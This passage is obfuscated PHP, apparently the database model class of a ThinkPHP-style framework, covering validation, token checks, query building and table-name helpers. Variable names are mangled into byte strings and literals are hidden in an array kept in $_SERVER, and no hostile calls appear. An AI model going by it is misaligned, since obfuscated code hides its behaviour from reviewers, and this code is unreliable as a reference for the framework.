$ş±áìÌÑ : 1; } if ($ş±áìÌÑ === $Ïë°ó°Ü[333]) { unset($Š‹ÔæŠó[$Ïë°ó°Ü[369]]); } $“œĞ©  = $this->db->select($Š‹ÔæŠó); if (!empty($“œĞ© )) { if ($ş±áìÌÑ === $Ïë°ó°Ü[333]) { return reset($“œĞ© [0]); } if (!0 !== $ş±áìÌÑ && 1 == $Š‹ÔæŠó[$Ïë°ó°Ü[369]]) { return reset($“œĞ© [0]); } foreach ($“œĞ©  as $¦Ô™›ÒÃ) { $»ÜÌç–ä[] = $¦Ô™›ÒÃ[$ìğò¬à£]; } return $»ÜÌç–ä; } } return null; } public function create($èÀÈİÃ = '', $¾ˆÍıòÑ = '') { $ëøÇ®È’ =& $_SERVER[öæÛ¿©¿]; if (empty($èÀÈİÃ)) { $èÀÈİÃ = $_POST; } elseif (is_object($èÀÈİÃ)) { $èÀÈİÃ = get_object_vars($èÀÈİÃ); } if (empty($èÀÈİÃ) || !is_array($èÀÈİÃ)) { $this->error = think_lang($ëøÇ®È’[350]); return !1; } $èÀÈİÃ = $this->parseFieldsMap($èÀÈİÃ, 0); $¾ˆÍıòÑ = $¾ˆÍıòÑ ? $¾ˆÍıòÑ : (!empty($èÀÈİÃ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ëøÇ®È’[352]])) { $©Â·ÎĞ÷ = $this->options[$ëøÇ®È’[352]]; unset($this->options[$ëøÇ®È’[352]]); } elseif ($¾ˆÍıòÑ == THINK_MODEL_INSERT && isset($this->insertFields)) { $©Â·ÎĞ÷ = $this->insertFields; } elseif ($¾ˆÍıòÑ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $©Â·ÎĞ÷ = $this->updateFields; } if (isset($©Â·ÎĞ÷)) { if (is_string($©Â·ÎĞ÷)) { $©Â·ÎĞ÷ = explode($ëøÇ®È’[50], $©Â·ÎĞ÷); } if (think_config($ëøÇ®È’[374])) { $©Â·ÎĞ÷[] = think_config($ëøÇ®È’[375]); } foreach ($èÀÈİÃ as $Ò«òáô => $ŠßîŞã÷) { if (!in_array($Ò«òáô, $©Â·ÎĞ÷)) { unset($èÀÈİÃ[$Ò«òáô]); } } } if (!$this->autoValidation($èÀÈİÃ, $¾ˆÍıòÑ)) { return !1; } if (!$this->autoCheckToken($èÀÈİÃ)) { $this->error = think_lang($ëøÇ®È’[376]); return !1; } if ($this->autoCheckFields) { $©Â·ÎĞ÷ = $this->getDbFields(); foreach ($èÀÈİÃ as $Ò«òáô => $ŠßîŞã÷) { if (!in_array($Ò«òáô, $©Â·ÎĞ÷)) { unset($èÀÈİÃ[$Ò«òáô]); } elseif (MAGIC_QUOTES_GPC && is_string($ŠßîŞã÷)) { $èÀÈİÃ[$Ò«òáô] = stripslashes($ŠßîŞã÷); } } } $this->autoOperation($èÀÈİÃ, $¾ˆÍıòÑ); $this->data = $èÀÈİÃ; return $èÀÈİÃ; } public function autoCheckToken($ÅğûÇ—) { $·¤š„ÖŒ =& $_SERVER[öæÛ¿©¿]; if (isset($this->options[$·¤š„ÖŒ[377]]) && !$this->options[$·¤š„ÖŒ[377]]) { return !0; } if (think_config($·¤š„ÖŒ[374])) { $£«¿–ÆÖ = think_config($·¤š„ÖŒ[375]); if (!isset($ÅğûÇ—[$£«¿–ÆÖ]) || Session::get($£«¿–ÆÖ)) { return !1; } list($¦ùÍÀ®ğ, $‘øÓÚ²¥) = explode($·¤š„ÖŒ[11], $ÅğûÇ—[$£«¿–ÆÖ]); if ($‘øÓÚ²¥ && Session::get($£«¿–ÆÖ . $·¤š„ÖŒ[10] . $¦ùÍÀ®ğ) === $‘øÓÚ²¥) { Session::remove($£«¿–ÆÖ . $·¤š„ÖŒ[10] . $¦ùÍÀ®ğ); return !0; } if (think_config($·¤š„ÖŒ[378])) { Session::remove($£«¿–ÆÖ . $·¤š„ÖŒ[10] . $¦ùÍÀ®ğ); } return !1; } return !0; } public function regex($°ô×—÷, $›‹©–â…) { $ŸÃí¯Èƒ =& $_SERVER[öæÛ¿©¿]; $É‘„ñ‹È = array($ŸÃí¯Èƒ[379] => $ŸÃí¯Èƒ[380], $ŸÃí¯Èƒ[381] => $ŸÃí¯Èƒ[382], $ŸÃí¯Èƒ[383] => $ŸÃí¯Èƒ[384], $ŸÃí¯Èƒ[385] => $ŸÃí¯Èƒ[386], $ŸÃí¯Èƒ[387] => $ŸÃí¯Èƒ[388], $ŸÃí¯Èƒ[389] => $ŸÃí¯Èƒ[390], $ŸÃí¯Èƒ[391] => $ŸÃí¯Èƒ[392], $ŸÃí¯Èƒ[367] => $ŸÃí¯Èƒ[393], $ŸÃí¯Èƒ[394] => $ŸÃí¯Èƒ[395]); if (isset($É‘„ñ‹È[strtolower($›‹©–â…)])) { $›‹©–â… = $É‘„ñ‹È[strtolower($›‹©–â…)]; } return preg_match($›‹©–â…, $°ô×—÷) === 1; } private function autoOperation(&$Õ…›¤¯, $Î—ã†„ª) { $ªÊ¨Æ”í =& $_SERVER[öæÛ¿©¿]; if (!empty($this->options[$ªÊ¨Æ”í[396]])) { $›å‹˜ Ñ = $this->options[$ªÊ¨Æ”í[396]]; unset($this->options[$ªÊ¨Æ”í[396]]); } elseif (!empty($this->_auto)) { $›å‹˜ Ñ = $this->_auto; } if (isset($›å‹˜ Ñ)) { foreach ($›å‹˜ Ñ as $¤ã«¡ôä) { if (empty($¤ã«¡ôä[2])) { $¤ã«¡ôä[2] = THINK_MODEL_INSERT; } if ($Î—ã†„ª == $¤ã«¡ôä[2] || $¤ã«¡ôä[2] == THINK_MODEL_BOTH) { switch (trim($¤ã«¡ôä[3])) { case $ªÊ¨Æ”í[397]: case $ªÊ¨Æ”í[398]: $ïøõ‹Ì = isset($¤ã«¡ôä[4]) ? (array) $¤ã«¡ôä[4] : array(); if (isset($Õ…›¤¯[$¤ã«¡ôä[0]])) { array_unshift($ïøõ‹Ì, $Õ…›¤¯[$¤ã«¡ôä[0]]); } if ($ªÊ¨Æ”í[397] == $¤ã«¡ôä[3]) { $Õ…›¤¯[$¤ã«¡ôä[0]] = call_user_func_array($¤ã«¡ôä[1], $ïøõ‹Ì); } else { $Õ…›¤¯[$¤ã«¡ôä[0]] = call_user_func_array(array(&$this, $¤ã«¡ôä[1]), $ïøõ‹Ì); } break; case $ªÊ¨Æ”í[352]: $Õ…›¤¯[$¤ã«¡ôä[0]] = $Õ…›¤¯[$¤ã«¡ôä[1]]; break; case $ªÊ¨Æ”í[399]: if ($ªÊ¨Æ”í[12] === $Õ…›¤¯[$¤ã«¡ôä[0]]) { unset($Õ…›¤¯[$¤ã«¡ôä[0]]); } break; case $ªÊ¨Æ”í[400]: default: $Õ…›¤¯[$¤ã«¡ôä[0]] = $¤ã«¡ôä[1]; } if (!1 === $Õ…›¤¯[$¤ã«¡ôä[0]]) { unset($Õ…›¤¯[$¤ã«¡ôä[0]]); } } } } return $Õ…›¤¯; } protected function autoValidation($‘ÔÍã†Ï, $±Ï·…ĞÂ) { $Òõ«™ú‰ =& $_SERVER[öæÛ¿©¿]; if (!empty($this->options[$Òõ«™ú‰[401]])) { $ìÅĞ˜˜ƒ = $this->options[$Òõ«™ú‰[401]]; unset($this->options[$Òõ«™ú‰[401]]); } elseif (!empty($this->_validate)) { $ìÅĞ˜˜ƒ = $this->_validate; } if (isset($ìÅĞ˜˜ƒ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ìÅĞ˜˜ƒ as $úİã½§ğ => $¾ıéšÕ¤) { if (empty($¾ıéšÕ¤[5]) || $¾ıéšÕ¤[5] == THINK_MODEL_BOTH || $¾ıéšÕ¤[5] == $±Ï·…ĞÂ) { if (0 == strpos($¾ıéšÕ¤[2], $Òõ«™ú‰[402]) && strpos($¾ıéšÕ¤[2], $Òõ«™ú‰[403])) { $¾ıéšÕ¤[2] = think_lang(substr($¾ıéšÕ¤[2], 2, -1)); } $¾ıéšÕ¤[3] = isset($¾ıéšÕ¤[3]) ? $¾ıéšÕ¤[3] : THINK_EXISTS_VALIDATE; $¾ıéšÕ¤[4] = isset($¾ıéšÕ¤[4]) ? $¾ıéšÕ¤[4] : $Òõ«™ú‰[404]; switch ($¾ıéšÕ¤[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($‘ÔÍã†Ï, $¾ıéšÕ¤)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Òõ«™ú‰[12] != trim($‘ÔÍã†Ï[$¾ıéšÕ¤[0]])) { if (!1 === $this->_validationField($‘ÔÍã†Ï, $¾ıéšÕ¤)) { return !1; } } break; default: if (isset($‘ÔÍã†Ï[$¾ıéšÕ¤[0]])) { if (!1 === $this->_validationField($‘ÔÍã†Ï, $¾ıéšÕ¤)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ÜÆ¼Ğ°ë, $Øƒü“) { if (!1 === $this->_validationFieldItem($ÜÆ¼Ğ°ë, $Øƒü“)) { if ($this->patchValidate) { $this->error[$Øƒü“[0]] = $Øƒü“[2]; } else { $this->error = $Øƒü“[2]; return !1; } } return; } protected function _validationFieldItem($Ã†ªĞöò, $ìƒ¤›¥¢) { $œÌâ•ı =& $_SERVER[öæÛ¿©¿]; switch (strtolower(trim($ìƒ¤›¥¢[4]))) { case $œÌâ•ı[397]: case $œÌâ•ı[398]: $ç¬æ×™ = isset($ìƒ¤›¥¢[6]) ? (array) $ìƒ¤›¥¢[6] : array(); if (is_string($ìƒ¤›¥¢[0]) && strpos($ìƒ¤›¥¢[0], $œÌâ•ı[50])) { $ìƒ¤›¥¢[0] = explode($œÌâ•ı[50], $ìƒ¤›¥¢[0]); } if (is_array($ìƒ¤›¥¢[0])) { foreach ($ìƒ¤›¥¢[0] as $ÅÆıà§³) { $Ú‡ƒ„˜Ö[$ÅÆıà§³] = $Ã†ªĞöò[$ÅÆıà§³]; } array_unshift($ç¬æ×™, $Ú‡ƒ„˜Ö); } else { array_unshift($ç¬æ×™, $Ã†ªĞöò[$ìƒ¤›¥¢[0]]); } if ($œÌâ•ı[397] == $ìƒ¤›¥¢[4]) { return call_user_func_array($ìƒ¤›¥¢[1], $ç¬æ×™); } else { return call_user_func_array(array(&$this, $ìƒ¤›¥¢[1]), $ç¬æ×™); } case $œÌâ•ı[405]: return $Ã†ªĞöò[$ìƒ¤›¥¢[0]] == $Ã†ªĞöò[$ìƒ¤›¥¢[1]]; case $œÌâ•ı[406]: if (is_string($ìƒ¤›¥¢[0]) && strpos($ìƒ¤›¥¢[0], $œÌâ•ı[50])) { $ìƒ¤›¥¢[0] = explode($œÌâ•ı[50], $ìƒ¤›¥¢[0]); } $å¶‡Ø¡ = array(); if (is_array($ìƒ¤›¥¢[0])) { foreach ($ìƒ¤›¥¢[0] as $ÅÆıà§³) { $å¶‡Ø¡[$ÅÆıà§³] = $Ã†ªĞöò[$ÅÆıà§³]; } } else { $å¶‡Ø¡[$ìƒ¤›¥¢[0]] = $Ã†ªĞöò[$ìƒ¤›¥¢[0]]; } if (!empty($Ã†ªĞöò[$this->getPk()])) { $å¶‡Ø¡[$this->getPk()] = array($œÌâ•ı[407], $Ã†ªĞöò[$this->getPk()]); } if ($this->where($å¶‡Ø¡)->find()) { return !1; } return !0; default: return $this->check($Ã†ªĞöò[$ìƒ¤›¥¢[0]], $ìƒ¤›¥¢[1], $ìƒ¤›¥¢[4]); } } public function check($òß€ïŠğ, $à—¤Ü, $Î—¨å¯ù = "\x72\x65\147\145\170") { $¨èÍö¥Ş =& $_SERVER[öæÛ¿©¿]; $Î—¨å¯ù = strtolower(trim($Î—¨å¯ù)); switch ($Î—¨å¯ù) { case $¨èÍö¥Ş[7]: case $¨èÍö¥Ş[408]: $ˆå®‹¾ê = is_array($à—¤Ü) ? $à—¤Ü : explode($¨èÍö¥Ş[50], $à—¤Ü); return $Î—¨å¯ù == $¨èÍö¥Ş[7] ? in_array($òß€ïŠğ, $ˆå®‹¾ê) : !in_array($òß€ïŠğ, $ˆå®‹¾ê); case $¨èÍö¥Ş[409]: case $¨èÍö¥Ş[410]: if (is_array($à—¤Ü)) { $çÁÖÛÎó = $à—¤Ü[0]; $¢‚ˆÖò± = $à—¤Ü[1]; } else { list($çÁÖÛÎó, $¢‚ˆÖò±) = explode($¨èÍö¥Ş[50], $à—¤Ü); } return $Î—¨å¯ù == $¨èÍö¥Ş[409] ? $òß€ïŠğ >= $çÁÖÛÎó && $òß€ïŠğ <= $¢‚ˆÖò± : $òß€ïŠğ < $çÁÖÛÎó || $òß€ïŠğ > $¢‚ˆÖò±; case $¨èÍö¥Ş[411]: case $¨èÍö¥Ş[412]: return $Î—¨å¯ù == $¨èÍö¥Ş[411] ? $òß€ïŠğ == $à—¤Ü : $òß€ïŠğ != $à—¤Ü; case $¨èÍö¥Ş[413]: $Î‡óûñ = mb_strlen($òß€ïŠğ, $¨èÍö¥Ş[414]); if (strpos($à—¤Ü, $¨èÍö¥Ş[50])) { list($çÁÖÛÎó, $¢‚ˆÖò±) = explode($¨èÍö¥Ş[50], $à—¤Ü); return $Î‡óûñ >= $çÁÖÛÎó && $Î‡óûñ <= $¢‚ˆÖò±; } else { return $Î‡óûñ == $à—¤Ü; } case $¨èÍö¥Ş[415]: list($­·©Šš, $ÃÊÚâ˜) = explode($¨èÍö¥Ş[50], $à—¤Ü); if (!is_numeric($­·©Šš)) { $­·©Šš = strtotime($­·©Šš); } if (!is_numeric($ÃÊÚâ˜)) { $ÃÊÚâ˜ = strtotime($ÃÊÚâ˜); } return NOW_TIME >= $­·©Šš && NOW_TIME <= $ÃÊÚâ˜; case $¨èÍö¥Ş[416]: return in_array(get_client_ip(), explode($¨èÍö¥Ş[50], $à—¤Ü)); case $¨èÍö¥Ş[417]: return !in_array(get_client_ip(), explode($¨èÍö¥Ş[50], $à—¤Ü)); case $¨èÍö¥Ş[404]: default: return $this->regex($òß€ïŠğ, $à—¤Ü); } } public function query($÷ó¡Å¾–, $ •·Õ®• = false) { $‰‡›ë—› =& $_SERVER[öæÛ¿©¿]; if (!is_bool($ •·Õ®•) && !is_array($ •·Õ®•)) { $ •·Õ®• = func_get_args(); array_shift($ •·Õ®•); } $÷ó¡Å¾– = str_replace(array($‰‡›ë—›[286], $‰‡›ë—›[418]), $‰‡›ë—›[53], $÷ó¡Å¾–); $÷ó¡Å¾– = $this->parseSql($÷ó¡Å¾–, $ •·Õ®•); return $this->db->query($÷ó¡Å¾–); } public function execute($ùÌí§Íü, $ÖôÈš°ë = false) { if (!is_bool($ÖôÈš°ë) && !is_array($ÖôÈš°ë)) { $ÖôÈš°ë = func_get_args(); array_shift($ÖôÈš°ë); } $ùÌí§Íü = $this->parseSql($ùÌí§Íü, $ÖôÈš°ë); return $this->db->execute($ùÌí§Íü); } protected function parseSql($Ã÷ñ²‚¼, $©ÔéŞ) { $Òß›šÓÎ =& $_SERVER[öæÛ¿©¿]; if (!0 === $©ÔéŞ) { $¯†½ùÊÒ = $this->_parseOptions(); $Ã÷ñ²‚¼ = $this->db->parseSql($Ã÷ñ²‚¼, $¯†½ùÊÒ); } elseif (is_array($©ÔéŞ)) { $©ÔéŞ = array_map(array($this->db, $Òß›šÓÎ[419]), $©ÔéŞ); $Ã÷ñ²‚¼ = vsprintf($Ã÷ñ²‚¼, $©ÔéŞ); } else { $Ã÷ñ²‚¼ = strtr($Ã÷ñ²‚¼, array($Òß›šÓÎ[420] => $this->getTableName(), $Òß›šÓÎ[421] => think_config($Òß›šÓÎ[322]))); } $this->db->setModel($this->name); return $Ã÷ñ²‚¼; } public function db($äº¬§†† = '', $÷õ±à˜ = '', $¶í™ÙÙ« = array()) { $±œúÒß =& $_SERVER[öæÛ¿©¿]; if ($±œúÒß[12] === $äº¬§†† && $this->db) { return $this->db; } static $’¨ŒÍŠò = array(); static $Çìç­¸È = array(); if (!isset($Çìç­¸È[$äº¬§††]) || isset($Çìç­¸È[$äº¬§††]) && $÷õ±à˜ && $’¨ŒÍŠò[$äº¬§††] != $÷õ±à˜) { if (!empty($÷õ±à˜) && is_string($÷õ±à˜) && !1 === strpos($÷õ±à˜, $±œúÒß[8])) { $÷õ±à˜ = think_config($÷õ±à˜); } $äº¬§†† = think_guid($÷õ±à˜); $Çìç­¸È[$äº¬§††] = Db::getInstance($÷õ±à˜); } elseif (NULL === $÷õ±à˜) { $Çìç­¸È[$äº¬§††]->close(); unset($Çìç­¸È[$äº¬§††]); return; } if (!empty($¶í™ÙÙ«)) { if (is_string($¶í™ÙÙ«)) { parse_str($¶í™ÙÙ«, $¶í™ÙÙ«); } foreach ($¶í™ÙÙ« as $©Ÿ°ãï… => $¯¢õå­) { $this->setProperty($©Ÿ°ãï…, $¯¢õå­); } } $’¨ŒÍŠò[$äº¬§††] = $÷õ±à˜; $this->db = $Çìç­¸È[$äº¬§††]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $÷Šôˆø = get_class($this); if ($÷Šôˆø == $_SERVER[öæÛ¿©¿][422]) { return $this->name; } $this->name = substr($÷Šôˆø, 0, -5); } return $this->name; } public function getTableName() { $ÇÆ§Óéø =& $_SERVER[öæÛ¿©¿]; if (empty($this->trueTableName)) { $…›ı„Éœ = !empty($this->tablePrefix) ? $this->tablePrefix : $ÇÆ§Óéø[12]; if (!empty($this->tableName)) { $…›ı„Éœ .= $this->tableName; } else { $…›ı„Éœ .= think_parse_name($this->name); } $this->trueTableName = strtolower($…›ı„Éœ); } return (!empty($this->dbName) ? $this->dbName . $ÇÆ§Óéø[10] : $ÇÆ§Óéø[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ŒÔÓÍ½± =& $_SERVER[öæÛ¿©¿]; return isset($this->fields[$ŒÔÓÍ½±[329]]) ? $this->fields[$ŒÔÓÍ½±[329]] : $this->pk; } public function getDbFields() { $¦ï˜¡ÄÂ =& $_SERVER[öæÛ¿©¿]; if (isset($this->options[$¦ï˜¡ÄÂ[358]])) { $¦çãµÊ = $this->db->getFields($this->options[$¦ï˜¡ÄÂ[358]]); return $¦çãµÊ ? array_keys($¦çãµÊ) : !1; } if ($this->fields) { $¦çãµÊ = $this->fields; unset($¦çãµÊ[$¦ï˜¡ÄÂ[328]], $¦çãµÊ[$¦ï˜¡ÄÂ[329]], $¦çãµÊ[$¦ï˜¡ÄÂ[330]], $¦çãµÊ[$¦ï˜¡ÄÂ[327]]); return $¦çãµÊ; } return !1; } public function data($ÁµñÑèº = '') { $¢µ§Ú£é =& $_SERVER[öæÛ¿©¿]; if ($¢µ§Ú£é[12] === $ÁµñÑèº && !empty($this->data)) { return $this->data; } if (is_object($ÁµñÑèº)) { $ÁµñÑèº = get_object_vars($ÁµñÑèº); } elseif (is_string($ÁµñÑèº)) { parse_str($ÁµñÑèº, $ÁµñÑèº); } elseif (!is_array($ÁµñÑèº)) { think_exception(think_lang($¢µ§Ú£é[350])); } $this->data = $ÁµñÑèº; return $this; } public function join($Ä²âÅ˜¯) { $ğ¿©¾º =& $_SERVER[öæÛ¿©¿]; if (is_array($Ä²âÅ˜¯)) { $this->options[$ğ¿©¾º[361]] = $Ä²âÅ˜¯; } elseif (!empty($Ä²âÅ˜¯)) { $this->options[$ğ¿©¾º[361]][] = $Ä²âÅ˜¯; } return $this; } public function union($øÙóØıì, $½ÍœşÀ¹ = false) { $È»ÖØ«Ü =& $_SERVER[öæÛ¿©¿]; if (empty($øÙóØıì)) { return $this; } if ($½ÍœşÀ¹) { $this->options[$È»ÖØ«Ü[423]][$È»ÖØ«Ü[424]] = !0; } if (is_object($øÙóØıì)) { $øÙóØıì = get_object_vars($øÙóØıì); } if (is_string($øÙóØıì)) { $÷±•ƒ” = $øÙóØıì; } elseif (is_array($øÙóØıì)) { if (isset($øÙóØıì[0])) { $this->options[$È»ÖØ«Ü[423]] = array_merge($this->options[$È»ÖØ«Ü[423]], $øÙóØıì); return $this; } else { $÷±•ƒ” = $øÙóØıì; } } else { think_exception(think_lang($È»ÖØ«Ü[350])); } $this->options[$È»ÖØ«Ü[423]][] = $÷±•ƒ”; return $this; } public function cache($’Ô¨ˆ±¥ = true, $½åÓÜ×š = null, $ù‰óá› = '') { $Ì·Ë£üÄ =& $_SERVER[öæÛ¿©¿]; if (!1 !== $’Ô¨ˆ±¥) { $this->options[$Ì·Ë£üÄ[425]] = array($Ì·Ë£üÄ[95] => $’Ô¨ˆ±¥, $Ì·Ë£üÄ[415] => $½åÓÜ×š, $Ì·Ë£üÄ[33] => $ù‰óá›); } return $this; } public function field($¹ñæŞÍ, $€‘«½À“ = false) { $Ó¾şÉ÷Ü =& $_SERVER[öæÛ¿©¿]; if (!0 === $¹ñæŞÍ) { $Ñ÷µÑ©ä = $this->getDbFields(); $¹ñæŞÍ = $Ñ÷µÑ©ä ? $Ñ÷µÑ©ä : $Ó¾şÉ÷Ü[221]; } elseif ($€‘«½À“) { if (is_string($¹ñæŞÍ)) { $¹ñæŞÍ = explode($Ó¾şÉ÷Ü[50], $¹ñæŞÍ); } $Ñ÷µÑ©ä = $this->getDbFields(); $¹ñæŞÍ = $Ñ÷µÑ©ä ? array_diff($Ñ÷µÑ©ä, $¹ñæŞÍ) : $¹ñæŞÍ; } $this->options[$Ó¾şÉ÷Ü[352]] = $¹ñæŞÍ; return $this; } public function scope($›¸Ñá‚ø = '', $¸²¾šø² = NULL) { $¡òÕş =& $_SERVER[öæÛ¿©¿]; if ($¡òÕş[12] === $›¸Ñá‚ø) { if (isset($this->_scope[$¡òÕş[37]])) { $ºÀÁ•« = $this->_scope[$¡òÕş[37]]; } else { return $this; } } elseif (is_string($›¸Ñá‚ø)) { $ÓÜÀ³º = explode($¡òÕş[50], $›¸Ñá‚ø); $ºÀÁ•« = array(); foreach ($ÓÜÀ³º as $ø›•Â) { if (!isset($this->_scope[$ø›•Â])) { continue; } $ºÀÁ•« = array_merge($ºÀÁ•«, $this->_scope[$ø›•Â]); } if (!empty($¸²¾šø²) && is_array($¸²¾šø²)) { $ºÀÁ•« = array_merge($ºÀÁ•«, $¸²¾šø²); } } elseif (is_array($›¸Ñá‚ø)) { $ºÀÁ•« = $›¸Ñá‚ø; } if (is_array($ºÀÁ•«) && !empty($ºÀÁ•«)) { $this->options = array_merge($this->options, array_change_key_case($ºÀÁ•«)); } return $this; } public function where($ó”ƒôÃ, $Å´¯®—¾ = null) { $“›Ã‰‘‚ =& $_SERVER[öæÛ¿©¿]; if (!is_null($Å´¯®—¾) && is_string($ó”ƒôÃ)) { if (!is_array($Å´¯®—¾)) { $Å´¯®—¾ = func_get_args(); array_shift($Å´¯®—¾); } $Å´¯®—¾ = array_map(array($this->db, $“›Ã‰‘‚[419]), $Å´¯®—¾); $ó”ƒôÃ = vsprintf($ó”ƒôÃ, $Å´¯®—¾); } elseif (is_object($ó”ƒôÃ)) { $ó”ƒôÃ = get_object_vars($ó”ƒôÃ); } elseif (is_array($ó”ƒôÃ)) { foreach ($ó”ƒôÃ as $¬ášáÀ€ => $œõáªô) { if ((is_numeric($¬ášáÀ€) || !$¬ášáÀ€) && is_string($œõáªô)) { if (strpos($œõáªô, $“›Ã‰‘‚[426]) === 0) { continue; } think_trace($“›Ã‰‘‚[427], $“›Ã‰‘‚[12], $“›Ã‰‘‚[49]); die; } } } if (is_string($ó”ƒôÃ) && $“›Ã‰‘‚[12] != $ó”ƒôÃ) { $ê—òğ±ï = array(); $ê—òğ±ï[$“›Ã‰‘‚[428]] = $ó”ƒôÃ; $ó”ƒôÃ = $ê—òğ±ï; } if (isset($this->options[$“›Ã‰‘‚[354]])) { $this->options[$“›Ã‰‘‚[354]] = array_merge($this->options[$“›Ã‰‘‚[354]], $ó”ƒôÃ); } else { $this->options[$“›Ã‰‘‚[354]] = $ó”ƒôÃ; } return $this; } public function limit($·óÖâÓ, $Ã¤ Æ×¶ = null) { $©öÚ£Ì¨ =& $_SERVER[öæÛ¿©¿]; $this->options[$©öÚ£Ì¨[369]] = is_null($Ã¤ Æ×¶) ? $·óÖâÓ : $·óÖâÓ . $©öÚ£Ì¨[50] . $Ã¤ Æ×¶; return $this; } public function page($Ëêõ»Ş, $âÒ‰óÜ¨ = null) { $Ñ‡­Œ§ =& $_SERVER[öæÛ¿©¿]; $this->options[$Ñ‡­Œ§[429]] = is_null($âÒ‰óÜ¨) ? $Ëêõ»Ş : $Ëêõ»Ş . $Ñ‡­Œ§[50] . $âÒ‰óÜ¨; return $this; } public function comment($ĞÇŒĞœÑ) { $this->options[$_SERVER[öæÛ¿©¿][430]] = $ĞÇŒĞœÑ; return $this; } public function setProperty($¡ŠŞ„ğš, $»Ÿ£á»¼) { if (property_exists($this, $¡ŠŞ„ğš)) { $this->{$¡ŠŞ„ğš} = $»Ÿ£á»¼; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\x64\151\146\171\124\x69\155\145", "\x74\x69\x6d\x65", "\151\156\163\x65\162\x74\x2c\165\x70\144\141\164\x65", "\146\165\x6e\143\164\x69\x6f\156"), array("\x63\162\x65\x61\x74\x65\x54\151\x6d\145", "\164\x69\x6d\145", "\151\156\x73\x65\162\x74", "\146\165\156\x63\164\x69\x6f\156")); public function setDataAuto($ŒïÔè‡Ñ) { $this->dataAuto = $ŒïÔè‡Ñ; } public function __construct($ÄãÙÌø¢ = '', $Ûû©êØ­ = '', $ì¦•Œ = '') { parent::__construct($ÄãÙÌø¢, $Ûû©êØ­, $ì¦•Œ); } protected $tableMeta = array(); protected function _beforeInsert(&$´ÙÅ÷ş, $Äü»¢Ô) { $Çª†Ú´ì =& $_SERVER[öæÛ¿©¿]; if (!$this->checkDataAutoHas($Çª†Ú´ì[431])) { return; } $this->dataBeforeFilter($´ÙÅ÷ş, $Çª†Ú´ì[431]); } protected function _beforeUpdate(&$œïú‰½á, $ì–¨ˆÂº) { $’¥ûù«Ú =& $_SERVER[öæÛ¿©¿]; if (!$this->checkDataAutoHas($’¥ûù«Ú[432])) { return; } $this->dataBeforeFilter($œïú‰½á, $’¥ûù«Ú[432]); } protected function _afterSelect(&$¹Ú€–‘, $œĞ‘şíÚ) { if (!is_array($¹Ú€–‘)) { return; } if (!$this->checkDataAutoHas($_SERVER[öæÛ¿©¿][433])) { return; } foreach ($¹Ú€–‘ as &$‚Ãü‚Ë¨) { $this->dataAfterFilter($‚Ãü‚Ë¨); } unset($‚Ãü‚Ë¨); } protected function _afterFind(&$¾«Ÿ´“œ, $˜Â§„Òé) { if (!is_array($¾«Ÿ´“œ)) { return; } if (!$this->checkDataAutoHas($_SERVER[öæÛ¿©¿][433])) { return; } $this->dataAfterFilter($¾«Ÿ´“œ); } public static function textEncode($ûÃ§È¿’) { if (!$ûÃ§È¿’) { return $ûÃ§È¿’; } $èğïÏ‚ = json_encode($ûÃ§È¿’); $èğïÏ‚ = preg_replace_callback($_SERVER[öæÛ¿©¿][434], function ($ªÙ€Æ‘) { return addslashes($ªÙ€Æ‘[0]); }, $èğïÏ‚); return json_decode($èğïÏ‚); } public static function textDecode($˜ÀËŞü¢) { $›‡­à½İ =& $_SERVER[öæÛ¿©¿]; if (!$˜ÀËŞü¢) { return $˜ÀËŞü¢; } $‘•Û÷ÏÅ = json_encode($˜ÀËŞü¢); $‘•Û÷ÏÅ = preg_replace_callback($›‡­à½İ[435], function ($‘Ñã–¿Ä) { return $_SERVER[öæÛ¿©¿][98]; }, $‘•Û÷ÏÅ); return json_decode($‘•Û÷ÏÅ); } public function setAutoIncrement($Í–öšìš) { $òå©Êæñ = array($this->getPk() => $Í–öšìš); $½¤÷Åáù = $this->data($òå©Êæñ)->add(); if ($½¤÷Åáù) { $this->delete($½¤÷Åáù); } } public function getAutoIncrement() { $›³á¡Â = $this->getTableName(); $âú‚Ú˜ = $this->max($this->getPk()); $Šèó–Ş² = $this->query("\x73\x68\157\167\40\164\x61\x62\154\145\40\163\164\x61\x74\x75\x73\40\167\x68\x65\162\x65\40\x4e\141\155\145\75\47{$›³á¡Â}\47"); $Ğ«šÏ÷ = $Šèó–Ş²[0][$_SERVER[öæÛ¿©¿][436]]; $¢àÏ®ê€ = max($âú‚Ú˜, $Ğ«šÏ÷); return $¢àÏ®ê€; } protected function _callBefore($ ×Ä°—‹, $úÅ£µî¸) { return $this->cacheCallCheck($ ×Ä°—‹, $úÅ£µî¸, !1); } protected function _callAfter($÷ãÆìÊ, $ìÔõó±ó) { return $this->cacheCallCheck($÷ãÆìÊ, $ìÔõó±ó, !0); } protected function cacheFunctionAlias($¹ğ˜æÛ¦) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($³û©«„Â, $ÀÛœĞ«ü, $ˆë‘§…Ÿ = false) { $¢¾Î™¯æ =& $_SERVER[öæÛ¿©¿]; $¾…ğî° = $this->cacheFunctionAlias($ÀÛœĞ«ü); if (!$¾…ğî°) { return; } foreach ($¾…ğî° as $ˆôÒ¼¯ß => $²¬ûê—) { $â… â¼Ì = $²¬ûê—[0]; $×Î‘•ÔÌ = explode($¢¾Î™¯æ[50], $²¬ûê—[1]); $øòâàıĞ = isset($²¬ûê—[2]) ? $²¬ûê—[2] : $¢¾Î™¯æ[12]; if ($³û©«„Â == $ˆôÒ¼¯ß) { return $this->cacheFunctionGet($ˆôÒ¼¯ß, $â… â¼Ì, $øòâàıĞ); } if ($ˆë‘§…Ÿ && 